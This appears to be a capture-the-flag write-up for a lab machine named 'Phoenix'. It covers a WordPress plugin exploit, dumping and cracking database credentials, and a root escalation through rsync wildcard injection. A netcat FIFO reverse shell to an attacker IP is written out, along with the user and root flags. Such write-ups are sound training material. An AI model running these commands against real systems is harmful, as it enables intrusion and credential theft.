@@ -1,0 +1,103 @@
+Start with a nmap scan
+	### nmap -sC -sV 10.10.11.149 ###
+	Found 3 open ports 22, 80 & 443
+
+found WP using on site and we use wpscan
+	### wpscan --url  https://phoenix.htb --disable-tls-checks ###
+	
+	And found the "Download-from-file" plugin
+	Using the exploit "https://www.exploit-db.com/exploits/50287" we get a reverse shell
+
+On the reverse shell we can found a file named "wp-config.php" here we can found the following credentials
+
+	/** The name of the database for WordPress */
+	define( 'DB_NAME', 'wordpress' );
+
+	/** MySQL database username */
+	define( 'DB_USER', 'wordpress' );
+
+	/** MySQL database password */
+	define( 'DB_PASSWORD', '<++32%himself%FIRM%section%32++>' );
+
+	/** MySQL hostname */
+	define( 'DB_HOST', 'localhost:/var/run/mysqld/mysqld.sock' );
+
+	/** Database charset to use in creating database tables. */
+	define( 'DB_CHARSET', 'utf8' );
+
+	/** The database collate type. Don't change this if in doubt. */
+	define( 'DB_COLLATE', '' );
+
+after this the next thing i did was logging into the db searching for credentials & found these ones;
+	### mysql -u wordpress -p wordpress -e "SELECT user_login,user_pass FROM wp_users;" ###
+	
+	user_login	user_pass
+	
+	Phoenix	$P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc.
+	john	$P$B8eBH6QfVODeb/gYCSJRvm9MyRv7xz.
+	Jsmith	$P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G.
+	Jane	$P$BJCq26vxPmaQtAthFcnyNv1322qxD91
+	Jack	$P$BzalVhBkVN.6ii8y/nbv3CTLbC0E9e.
+
+I proceed to crash the "Jsmith" hash 'cause it was the user with "user" permissions on the machine as "editor"
+	### hashcat -m 400 -a 0 usr-hash.txt /home/user/Extra-tools/rockyou.txt ###
+		$P$BV5kUPHrZfVDDWSkvbt/Fw3Oeozb.G. = superphoenix ///Jsmith a.k editor
+		$P$BA5zlC0IhOiJKMTK.nWBgUB4Lxh/gc. = phoenixthefirebird14 ///Phoenix
+
+Then i tried to login with ssh but a 2FA authentication was need it. After another research i was falling on a "rabithole"
+with a directory found on "/usr/share/doc/google-authenticator" thinking i can crack the 2FA code. Then i decied to look on the
+network interfaces and found that there was another ip address
+
+	ens160:	10.10.11.149	(this was the one i was given at the beginning of the challenge)
+	eth0:	10.10.12.13	(a new ip)
+
+Realize a nmap scan and nothing, apparently the ip it was only accepting connections from the "LAN" so a nc scan worked
+	### nc 10.11.12.13 22 -zv ###
+	
+	After that i wasn't able to get a ssh connection due to an error and then it get fixed with this command
+	### python3 -c "import pty; pty.spawn('/bin/bash');" ###
+	
+	Then i succeed with the ssh connection & was able to get the user flag
+	### ssh editor@10.11.12.13 ###
+	### cat user.txt ###
+
+ROOT/Priv Escalation
+
+This took me a while because nothing was found with LinePeas and i wasn't able to do a reverse engeneering to the only root executable 
+so with "pspys64" i was able to see what this file do and proceed with a "wildcard injection"
+
+file: /usr/locla/bin/cron.sh.x
+	
+	NOW=$(date +"%Y-%m-%d-%H-%M")
+	FILE="phoenix.htb.$NOW.tar"
+
+	cd /backups
+	mysqldump -u root wordpress > dbbackup.sql
+	tar -cf $FILE dbbackup.sql && rm dbbackup.sql	
+	gzip -9 $FILE
+	find . -type f -mmin +30 -delete
+	rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/
+	./cron.sh.x 
+	2022/04/09 23:10:24 CMD: UID=1002 PID=13920  | tar -cf phoenix.htb.2022-04-09-23-10.tar dbbackup.sql 
+	2022/04/09 23:10:24 CMD: UID=1002 PID=13921  | rm dbbackup.sql 
+	2022/04/09 23:10:24 CMD: UID=1002 PID=13922  | gzip -9 phoenix.htb.2022-04-09-23-10.tar 
+	2022/04/09 23:10:24 CMD: UID=1002 PID=13923  | find . -type f -mmin +30 -delete 
+
+bassically the only part that matters is this one:
+	rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/
+
+After that the only thing to do is to put a reverse shell on the "backups" directory
+	### echo "mkfifo /tmp/cztsoo; nc 10.10.14.148 8888 0</tmp/cztsoo | /bin/sh >/tmp/cztsoo 2>&1; rm /tmp/cztsoo" >> shell.sh ###
+	   Note: Do not create the file in the attacker machine and then download it with "wget". For some reason the exploit dont work 
+
+	### touch -- "-e sh shell.sh" ###
+	
+	Attacker machine:
+		### nc -lvnp 8888 ###
+
+Just wait 3 minutes and you will get the shell
+
+Happy hacking!!:)
+
+Usr-Flag: 4662b450131479c61319ed90a74159f8
+Root-Flag: 5e91c11a64e9d150ed1a48aee3ce6ea1
